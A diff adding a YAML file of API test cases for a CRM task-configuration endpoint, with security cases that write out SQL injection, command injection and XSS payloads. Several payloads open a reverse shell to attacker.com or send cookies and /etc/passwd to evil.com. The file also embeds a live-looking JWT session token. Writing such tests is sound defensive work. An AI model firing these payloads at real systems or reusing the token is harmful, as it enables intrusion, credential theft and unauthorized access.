@@ -1,0 +1,500 @@
+api_info:
+  name: save_config
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  base_url: https://yupao-test-backend.yupaowang.com
+test_cases:
+- case_id: SAVE_CONFIG_001
+  title: 正常请求-使用原始参数
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: &id001
+    Hm_lvt_14752563c89f0870e93d2f6ac497f815: '1778463007'
+    jwtToken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0ZW5hbnRzIjpbImFkcyIsImFtcyIsImNjb3MiLCJjbXMiLCJjc3MiLCJlZGkiLCJmZWlzaHVoNSIsImhhaXRvdSIsImhlbGxvIiwiamlnb25namlhIiwibW1zIiwicW1zIiwicW1zIiwicmNzIiwic2NybSIsInVwbXMiLCJ5dXBhbyIsInl1cGFvZGFvamlhIiwieXVwYW9kYW9qaWEiXSwib3BlbklkIjoib3VfZTQ5MDQyNWZhYTNiNmQxNGVjYTJlYjU3NWZiNmVjNDEiLCJ1c2VyTmFtZSI6IuaxpOeVqiIsImV4cCI6MTc4MDk2OTY1NywidXNlcklkIjoiNjcyYjdnNmQifQ.cdDLX1yyE4sn9-tu5BrYfxPdOwZKpKYrZxitBzqxPEk
+  body: &id005
+    planId: 1127
+    staffFsIds: &id002
+    - 672b7g6d
+    shareLimits: &id003
+    - staffFsId: 672b7g6d
+      limit: -1
+    orgIds: &id004
+    - 308
+  expected:
+    status_code: 200
+- case_id: SAVE_CONFIG_002
+  title: 异常-空请求体
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body: {}
+  expected:
+    status_code: 200
+- case_id: SAVE_CONFIG_003
+  title: 异常-缺少字段planId
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    staffFsIds: *id002
+    shareLimits: *id003
+    orgIds: *id004
+  expected:
+    status_code: 200
+- case_id: SAVE_CONFIG_004
+  title: 异常-缺少字段staffFsIds
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: 1127
+    shareLimits: *id003
+    orgIds: *id004
+  expected:
+    status_code: 200
+- case_id: SAVE_CONFIG_005
+  title: 异常-缺少字段shareLimits
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: 1127
+    staffFsIds: *id002
+    orgIds: *id004
+  expected:
+    status_code: 200
+- case_id: SAVE_CONFIG_NO_AUTH
+  title: 异常-未携带认证信息
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: {}
+  body: *id005
+  expected:
+    status_code: 200
+
+# ==================== 安全测试用例 ====================
+
+# --- SQL注入漏洞测试 ---
+- case_id: SAVE_CONFIG_SQL_001
+  title: 安全-SQL注入-单引号闭合
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127' OR '1'='1"
+    staffFsIds:
+    - "672b7g6d' OR '1'='1"
+    shareLimits:
+    - staffFsId: "672b7g6d' OR '1'='1"
+      limit: -1
+    orgIds:
+    - "308' OR '1'='1"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_SQL_002
+  title: 安全-SQL注入-注释符截断
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127; DROP TABLE cs_task_config;--"
+    staffFsIds:
+    - "672b7g6d'; DROP TABLE users;--"
+    shareLimits:
+    - staffFsId: "admin'--"
+      limit: -1
+    orgIds:
+    - "308; DELETE FROM org;--"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_SQL_003
+  title: 安全-SQL注入-双引号闭合
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: '1127" OR "1"="1"'
+    staffFsIds:
+    - '672b7g6d" OR "1"="1"'
+    shareLimits:
+    - staffFsId: '672b7g6d" OR "1"="1"'
+      limit: -1
+    orgIds:
+    - '308" OR "1"="1"'
+  expected:
+    status_code: 200
+
+# --- UNION注入漏洞测试 ---
+- case_id: SAVE_CONFIG_UNION_001
+  title: 安全-UNION注入-查询列数探测
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127 UNION SELECT NULL,NULL,NULL--"
+    staffFsIds:
+    - "672b7g6d' UNION SELECT 1,2,3--"
+    shareLimits:
+    - staffFsId: "' UNION SELECT username,password FROM users--"
+      limit: -1
+    orgIds:
+    - "308 UNION SELECT NULL--"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_UNION_002
+  title: 安全-UNION注入-信息泄露
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "0 UNION SELECT table_name,column_name,data_type FROM information_schema.columns--"
+    staffFsIds:
+    - "' UNION SELECT @@version,user(),database()--"
+    shareLimits:
+    - staffFsId: "' UNION ALL SELECT NULL,CONCAT(user,':',password) FROM mysql.user--"
+      limit: -1
+    orgIds:
+    - "0 UNION SELECT schema_name,NULL FROM information_schema.schemata--"
+  expected:
+    status_code: 200
+
+# --- 盲注漏洞测试 ---
+- case_id: SAVE_CONFIG_BLIND_001
+  title: 安全-布尔盲注-条件判断
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127 AND 1=1"
+    staffFsIds:
+    - "672b7g6d' AND '1'='1"
+    shareLimits:
+    - staffFsId: "672b7g6d' AND SUBSTRING(@@version,1,1)='5"
+      limit: -1
+    orgIds:
+    - "308 AND 1=2"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_BLIND_002
+  title: 安全-时间盲注-延时探测
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127; WAITFOR DELAY '0:0:5'--"
+    staffFsIds:
+    - "672b7g6d' AND SLEEP(5)--"
+    shareLimits:
+    - staffFsId: "672b7g6d' AND IF(1=1,SLEEP(5),0)--"
+      limit: -1
+    orgIds:
+    - "308; SELECT BENCHMARK(10000000,SHA1('test'))--"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_BLIND_003
+  title: 安全-报错注入-extractvalue
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))"
+    staffFsIds:
+    - "672b7g6d' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
+    shareLimits:
+    - staffFsId: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      limit: -1
+    orgIds:
+    - "308"
+  expected:
+    status_code: 200
+
+# --- 命令行注入测试 ---
+- case_id: SAVE_CONFIG_CMD_001
+  title: 安全-命令注入-管道符执行
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127|ls -la /etc/passwd"
+    staffFsIds:
+    - "672b7g6d;cat /etc/passwd"
+    shareLimits:
+    - staffFsId: "672b7g6d`whoami`"
+      limit: -1
+    orgIds:
+    - "308&&id"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_CMD_002
+  title: 安全-命令注入-反引号执行
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "`cat /etc/passwd`"
+    staffFsIds:
+    - "$(whoami)"
+    shareLimits:
+    - staffFsId: "672b7g6d;nc -e /bin/sh attacker.com 4444"
+      limit: -1
+    orgIds:
+    - "308|wget http://evil.com/shell.sh"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_CMD_003
+  title: 安全-命令注入-特殊符号组合
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1127\n/bin/sh -c 'echo vulnerable'"
+    staffFsIds:
+    - "672b7g6d%0a%0dls"
+    shareLimits:
+    - staffFsId: "../../../etc/passwd"
+      limit: -1
+    orgIds:
+    - "308;curl http://evil.com/?data=$(cat /etc/passwd)"
+  expected:
+    status_code: 200
+
+# --- XSS注入测试 ---
+- case_id: SAVE_CONFIG_XSS_001
+  title: 安全-XSS注入-script标签
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "<script>alert('XSS')</script>"
+    staffFsIds:
+    - "<script>document.location='http://evil.com/?c='+document.cookie</script>"
+    shareLimits:
+    - staffFsId: "<script>new Image().src='http://evil.com/steal?cookie='+document.cookie</script>"
+      limit: -1
+    orgIds:
+    - "<script>alert(document.domain)</script>"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_XSS_002
+  title: 安全-XSS注入-事件处理器
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "<img src=x onerror=alert('XSS')>"
+    staffFsIds:
+    - "<svg onload=alert('XSS')>"
+    shareLimits:
+    - staffFsId: "<body onload=alert('XSS')>"
+      limit: -1
+    orgIds:
+    - "<input onfocus=alert('XSS') autofocus>"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_XSS_003
+  title: 安全-XSS注入-编码绕过
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "&#60;script&#62;alert('XSS')&#60;/script&#62;"
+    staffFsIds:
+    - "%3Cscript%3Ealert('XSS')%3C/script%3E"
+    shareLimits:
+    - staffFsId: "javascript:alert('XSS')"
+      limit: -1
+    orgIds:
+    - "<iframe src='javascript:alert(1)'>"
+  expected:
+    status_code: 200
+
+# --- 字符超长测试 ---
+- case_id: SAVE_CONFIG_LONG_001
+  title: 边界-超长字符串-planId超长
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    staffFsIds:
+    - "672b7g6d"
+    shareLimits:
+    - staffFsId: "672b7g6d"
+      limit: -1
+    orgIds:
+    - 308
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_LONG_002
+  title: 边界-超长字符串-staffFsId超长
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: 1127
+    staffFsIds:
+    - "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+    shareLimits:
+    - staffFsId: "672b7g6d"
+      limit: -1
+    orgIds:
+    - 308
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_LONG_003
+  title: 边界-超长字符串-所有字段超长
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456"
+    staffFsIds:
+    - "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz"
+    shareLimits:
+    - staffFsId: "xyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyz"
+      limit: 99999999999999999
+    orgIds:
+    - "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
+  expected:
+    status_code: 200
+
+# --- 中文字符测试 ---
+- case_id: SAVE_CONFIG_CN_001
+  title: 边界-中文字符-planId含中文
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "计划编号一二三四五"
+    staffFsIds:
+    - "672b7g6d"
+    shareLimits:
+    - staffFsId: "672b7g6d"
+      limit: -1
+    orgIds:
+    - 308
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_CN_002
+  title: 边界-中文字符-所有字段含中文
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "测试计划编号中文特殊字符：！@#￥%……&*（）"
+    staffFsIds:
+    - "员工飞书编号中文测试"
+    shareLimits:
+    - staffFsId: "中文飞书编号《》？：""{}|"
+      limit: -1
+    orgIds:
+    - "组织架构中文编号测试"
+  expected:
+    status_code: 200
+
+- case_id: SAVE_CONFIG_CN_003
+  title: 边界-中文字符-特殊中文符号和emoji
+  method: POST
+  path: /crm-task/v1/csTaskConfig/plus/saveConfig
+  headers:
+    Content-Type: application/json
+    business: yupao
+  cookies: *id001
+  body:
+    planId: "🔥💀👻测试emoji和特殊字符™®©℃℉"
+    staffFsIds:
+    - "①②③㊀㊁㊂ⅠⅡⅢ"
+    shareLimits:
+    - staffFsId: "㈠㈡㈢⑴⑵⑶壹贰叁肆伍陆柒捌玖拾"
+      limit: -1
+    orgIds:
+    - "〇〡〢〣〤〥〦〧〨〩"
+  expected:
+    status_code: 200
